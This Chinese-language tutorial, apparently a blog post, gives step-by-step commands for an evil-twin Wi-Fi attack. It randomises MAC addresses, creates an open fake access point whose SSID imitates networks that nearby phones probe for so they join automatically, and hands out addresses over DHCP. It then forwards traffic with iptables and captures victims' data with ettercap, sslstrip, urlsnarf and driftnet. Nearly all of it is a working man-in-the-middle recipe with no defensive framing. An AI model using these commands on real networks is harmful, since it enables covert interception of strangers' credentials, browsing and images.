建立soft Ap并进行嗅探，主要有如下4步：

1.airbase-ng建立热点
2.dhcpd启动dhcp服务
3.iptables设置好转发规则，使接入Soft AP客户的数据可正常访问互联网
4.启动嗅探工具收集信息

## 启动monitor模式 ##

    airmon-ng start wlan1
    ifconfig wlan1 down
    macchanger –r wlan1
    ifconfig wlan1 up
    ifconfig mon0 down
    macchanger –r mon0
    ifconfig mon0 up 
## 使用airbase-ng建立OPN的Soft AP ##

airbase-ng主要用于建立OPN的AP，也就是不需要密码的公开AP。WEP加密的已经很少见了，不支持WPA加密。这一步中，最关键的是AP的ssid，ssid决定了AP欺骗性，也就是被连接的可能性。现在手机、平板电脑的客户端会自动记录连接过的AP信息，保存在/data/misc/wifi/wpa_suppliant.conf中，每个热点保存四个信息：ssid、psk（密码）、key_mgmt（加密方式）、priority（优先级）。注意，其中不含网卡的硬件地址.所以，只需前三项对上，便可自动连接。
手机wifi功能打开时，会不断向外发送probe信息包，里面包含ssid。可用airodump-ng查看当前网络环境下有哪些被probe的ssid，供伪造ssid时参考。
选定名称后，便可使用airbase-ng建立Fake AP了：
airbase-ng $FAKE_AP_INTERFACE -e $FAKE_AP_ESSID -c
airbase-ng运行成功后，ifconfig查看，会多出一个at0接口。


## dhcp服务 ##

客户端连接上SoftAP后，要给他们分配IP地址。这里有一条最关键，就是SoftAP的IP地址和Internet接口的IP地址不能在网一个段。比如，连接Internet网的网卡eth0，地址是10.10.10.138/24，则at0的地址后面不能设置为同一网段，这里设置为10.0.0.1/24。

### 安装dhcp服务 ###

    apt-get install isc-dhcp-server

接下来然后需要将SoftAP的接口，也就是airbase-ng创建的at0设置为该网段的网关：
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1500
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

### 启动dhcp服务 ###

    dhcpd -d -f -cf dhcpd.conf <INTERFACE>
    
## 使用iptables设置转发 ##

使用iptables设置转发，将用户连接SoftAP后的数据，转发到internet上，是非常关键的一步。网上各种版本很多，其实最简单的实现就一句指令：

    iptables -t nat -A POSTROUTING --out-interface $FAKE_AP_INTERNET -j MASQUERADE    #$FAKE_AP_INTERNET是外网接口
    
注意，转发生效需要本机开启ip_forward功能。指令是：

    echo "1" > /proc/sys/net/ipv4/ip_forward

由于后面运行ettercap时，会将该值再次变为0，所以等ettercap运行后再执行上述命令。

## 运行各种嗅探工具 ##

SoftAP建立并运行dhcp服务后，客户端就可以根据我们设定的规则连接上热点并正常浏览网页，运行各个程序了。接下来，就是针对Soft AP的接口at0，执行各种嗅探：

    ettercap -Tzq -i $FAKE_AP_AT_INTERFACE -w $SESSION_PATH/etter.pcap -L $SESSION_PATH/etter
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $SSLSTRIP_PORT
    sslstrip -pkf -l $SSLSTRIP_PORT -w $SESSION_PATH/sslstrip.log 2>/dev/null
    urlsnarf -i $1 | grep http > $SESSION_PATH/url.txt
    tail -f $SESSION_PATH/url.txt
    driftnet -i $1 -d $SESSION_PATH/
